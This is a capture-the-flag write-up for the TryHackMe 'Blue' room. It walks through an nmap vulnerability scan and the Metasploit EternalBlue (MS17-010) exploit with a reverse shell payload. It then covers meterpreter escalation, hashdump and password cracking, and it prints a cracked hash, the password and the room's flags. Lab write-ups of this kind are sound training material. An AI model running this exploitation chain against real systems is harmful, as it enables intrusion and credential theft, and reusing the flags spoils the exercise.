## ðŸ“Š Analysis & Screenshots

*** Recon ***

> After launching the THM AttackBox, I launch the terminal application and was given a practical to scan and figure out what exploit the mahcine was vulnerable to. To do this, i first had to
scan the machine using nmap by inputting the command "nmap -sV -vv --script vuln 10.201.19.15," then "enter."

> After the scan was complete i then had to figure out how many ports were open with a port number under 1000. I did figured it out by scrolling through the nmap scan information and saw that there were three
open ports with a port number under 1000.

> I then had to figure out what exploit the machine was vulnerable to. To find this i scrolled through the results and looked under "Host script results" and saw that it was vulnerable to "ms17-010."

*** Gain Access ***

> I was then given a practical to gain access to the windows shell. To do this i first had to launch Metasploit by inputting the command "msfconsole," then "enter." I then had to find the exploitation code to
run against the machine, i did this by inputting the command "search ms17," then "enter," and saw the exploitation code that needed to be run. The full path of the code was
"exploit/windows/smb/ms17_010_eternalblue."

> Next, i had to set RHOSTS to the target machine's IP address. To do this i inputted the command "set RHOSTS 10.201.83.152," then enter. Before exploiting the target i also had to set payload to
"windows/x64/shell/reverse_tcp."

> I then inputted the command "show options," then enter to confrim everything was set correctly.

> Then "run," then "enter" to carry out the exploit.

*** Escalate ***

> Next, i had to convert the windows shells to a meterpreter shell after backgrounding the gained shell. To do this i first backgrounded the shell by pressing "^+Z," then "y." After backgrounding i then
inputted the command "sessions," then "enter" to get the session ID to convert and saw that the session ID was "1." So to convert it i inputted the command "sessions -u 1," then "enter."

> I then had to change modules to "post/multi/manage/shell_to_meterpreter" by inputting "use post/multi/manage/shell_to_meterpreter," then "enter," then "show options," then "enter" to see what needed to be filled
out and saw that the option "SESSION" needed to be filled out.

> I then inputted the command "set session 1," then "enter" to set the SESSION option to 1. Then inputted the command "run," then "enter" to run the shell to meterpreter module.

> <img width="856" height="366" alt="blue10" src="https://github.com/user-attachments/assets/f863d6cc-c16d-4023-963a-342cf6484d3c" />

> I then had to select the meterpreter session after the conversion was complete by inputting the command "sessions 2."

> Next i had to verify that the target machine was escalated to NT AUTHORITY\SYSTEM. To do this i inputted the command "getuid," then "enter." This then displayed the server username as "NT AUTHORITY\SYSTEM."

> <img width="375" height="39" alt="blue13" src="https://github.com/user-attachments/assets/e36d236c-d9f3-4eb9-8002-995e62d06480" />

> Following, i had to list all the processes running and select a process that was running on the "NT AUTHORITY\SYSTEM." To do this i inputted the command "ps," then "enter." I then selected the process "3040"

> <img width="1326" height="757" alt="blue14" src="https://github.com/user-attachments/assets/562b1223-1d75-44aa-96b2-e0ad26ba70fb" />

> Next i had to migrate to that process. To do this i inputted the command "migrate 3040," then "enter."

> <img width="359" height="56" alt="blue15" src="https://github.com/user-attachments/assets/02ab4014-531d-44cc-8501-d5f3aad35993" />

> Using the elevated meterpreter shell i had to dump all the passwords on the machine to figure out the name of the non-default user. To do this i inputted the command "hashdump," then "enter." This then
displayed the non-default user "Jon."

> Next i had to crack "Jon" non-default user's hash to find his cracked password. To do so i had to google a free hash password cracker and selected the "crackstation.net" hash password cracker. I then
inputted the hash of "ffb43f0de35be4d9917ac0cc8ad57f8d" and got the cracked password of "alqfna22."

*** Find flag! ***

> I was given a practical to find three planted flags on the target machine. For the first flag i had to find it in the root folder. To do this i inputted the command "cd /," then "enter," then "ls," then
"enter" to list all the files and folders within the root directory. After locating the first flag "flag1.txt" i inputted the command "cat flag1.txt," then "enter." This then displayed the flag of
"flag{access_the_machine}."

> For the next flag which was "flag2.txt." In order for me to find this flag i had to first change the directory to "C:\Windows\System32\config" by inputting the command "cd Windows\\System32\\config\\,"
then "enter," then "ls," then "enter" to list all the files in that directory.

> After locating the flag "flag2.txt" within the directory i then entered "cat flag2.txt," then "enter," and got the flag of "flag{sam_database_elevated_access}."

> <img width="523" height="59" alt="blue20" src="https://github.com/user-attachments/assets/eb73c7de-78d2-4fe0-8e0b-b0ca44ebbb59" />

> For the last flag which was "flag3.txt" i had to get to "Documents" folder of the administrator user "Jon." To do this i first inputted the command "cd /" which brought me back to the root folder, then "ls,"
then "enter" to list all the folders within the root folder.

> After locating the "User" directory to get to that directory i inputted the command "cd User\\," then "enter," then "ls," then "enter" to see all the Users available.

> <img width="668" height="252" alt="blue22" src="https://github.com/user-attachments/assets/cf1c250a-4e2b-4f5e-8077-f5f906fbaf32" />

> After locating the "Jon" user i inputted the command "cd Jon\\," then "enter," then "ls," then "enter" to get to that user and list all the files and folders within that user

> <img width="424" height="80" alt="blue23" src="https://github.com/user-attachments/assets/9cc56586-9f32-4379-a891-41a324092a40" />

> Spotting the "Documents" folder within "Jon" user i then inputted the command "cd Document\\," then "enter" to get into the folder, then inputted the command "ls," then "enter" to list the contents of the
folder.

> After listing the contents i then inputted the command "cat flag3.txt," then "enter" to display the contents of the flag and what was revealed was "flag{admin_documents_can_be_valuable}."
